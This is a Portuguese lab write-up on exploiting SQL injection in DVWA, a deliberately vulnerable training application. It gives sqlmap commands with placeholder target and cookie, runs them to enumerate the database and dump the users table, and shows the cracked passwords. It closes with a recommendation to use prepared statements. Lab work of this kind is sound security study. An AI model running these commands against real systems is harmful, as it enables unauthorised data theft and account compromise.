# Documentação de Experimentos: Exploração de SQL Injection com sqlmap

Esta documentação detalha os passos para reproduzir a exploração de uma vulnerabilidade de SQL Injection no DVWA usando a ferramenta automatizada `sqlmap`.

## Ferramenta Utilizada
- **Nome**: sqlmap
- **Versão**: `1.9.6#stable`
- **Propósito**: Detecção e exploração automática de falhas de injeção SQL e tomada de controle de servidores de banco de dados.

## Pré-requisitos
1.  **Ambiente**: DVWA rodando e acessível.
2.  **Autenticação**: É necessário estar logado na aplicação. O cookie de sessão (`PHPSESSID`) deve ser obtido via ferramentas de desenvolvedor do navegador (F12 > Application > Cookies) após o login.
3.  **Configuração de Segurança**: DVWA configurado com nível de segurança `Low`.

---

## Passo a Passo da Exploração

### 1. Detecção da Vulnerabilidade
O primeiro passo é verificar se o parâmetro alvo (`id`) na URL é vulnerável.

**Comando:**
```bash
sqlmap -u "URL_DO_ALVO/?id=1&Submit=Submit" --cookie="PHPSESSID=SEU_COOKIE; security=low" --batch
```

**Resultados da Análise:**
O sqlmap identificou que o banco de dados backend é **MySQL** e que o parâmetro `id` é vulnerável a três tipos de injeção:
1.  **Boolean-based blind**: A aplicação responde Verdadeiro ou Falso baseada na injeção.
2.  **Error-based**: A aplicação retorna erros de banco de dados visíveis que contêm informações da estrutura.
3.  **UNION query**: Permite unir resultados de consultas injetadas aos resultados originais para extrair dados.

### 2. Enumeração de Bancos de Dados
Após confirmar a vulnerabilidade, o sqlmap listou os bancos de dados disponíveis.

**Resultado:**
```
available databases [2]:
[*] dvwa
[*] information_schema
```
O banco `dvwa` é o alvo de interesse.

### 3. Enumeração de Tabelas
Com o banco de dados alvo identificado (`dvwa`), o próximo passo é listar as tabelas contidas nele.

**Comando Utilizado:**
```bash
sqlmap -u "URL_DO_ALVO/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=SEU_COOKIE; security=low" \
  -D dvwa \
  --tables \
  --batch
```

**Explicação dos Parâmetros:**
- `-u "..."`: Define a URL alvo com os parâmetros GET.
- `--cookie="..."`: Passa o cookie de sessão autenticado e o nível de segurança do DVWA.
- `-D dvwa`: Especifica o banco de dados alvo (`dvwa`).
- `--tables`: Instrui o sqlmap a enumerar as tabelas do banco de dados especificado.
- `--batch`: Executa em modo não-interativo, aceitando as opções padrão para todas as perguntas.

**Resultado:**
Foram encontradas duas tabelas:
- `guestbook`
- `users` (Tabela crítica contendo credenciais)

### 4. Extração de Dados (Dump)
O objetivo final é extrair os dados da tabela `users` para obter credenciais de acesso.

**Comando Utilizado:**
```bash
sqlmap -u "URL_DO_ALVO/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=SEU_COOKIE; security=low" \
  -D dvwa \
  -T users \
  --dump \
  --batch
```

**Explicação dos Parâmetros:**
- `-T users`: Especifica a tabela alvo (`users`) dentro do banco de dados selecionado.
- `--dump`: Instrui o sqlmap a extrair (dump) todas as entradas da tabela especificada.

**Resultado:**
O sqlmap extraiu com sucesso 5 entradas da tabela `users`, incluindo hashes de senha. Como a flag `--batch` foi usada, o sqlmap também realizou um ataque de dicionário automático para tentar quebrar os hashes MD5 encontrados.

| user_id | user | password (Decrypted) |
| :--- | :--- | :--- |
| 1 | admin | `password` |
| 2 | gordonb | `abc123` |
| 3 | 1337 | `charley` |
| 4 | pablo | `letmein` |
| 5 | smithy | `password` |

### Conclusão
A exploração demonstrou com sucesso uma falha crítica de SQL Injection, permitindo a exfiltração completa da base de usuários e o comprometimento das contas administrativas, evidenciando a necessidade de sanitização de inputs (uso de Prepared Statements) na aplicação.